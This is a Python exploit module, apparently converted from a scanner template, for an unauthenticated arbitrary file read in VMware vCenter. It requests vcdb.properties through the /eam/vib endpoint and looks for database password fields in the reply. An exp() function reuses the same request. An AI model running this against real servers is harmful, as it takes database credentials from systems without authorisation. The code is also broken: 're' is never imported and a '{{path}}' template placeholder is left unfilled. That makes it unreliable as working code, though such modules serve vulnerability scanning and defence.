import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''VMware vCenter Unauthenticated Arbitrary File Read''',
        "description": '''''',
        "severity": "high",
        "references": [
            "https://kb.vmware.com/s/article/7960893", 
            "https://twitter.com/ptswarm/status/1316016337550938122"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["vmware", "lfi", "vcenter"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/eam/vib?id={{path}}\\vcdb.properties"""
        method = "GET"
        data = """"""
        headers = {}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (re.search(r"""(?m)^(driver|dbtype|password(\.encrypted)?)\s=""",resp0.text)) and (resp0.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url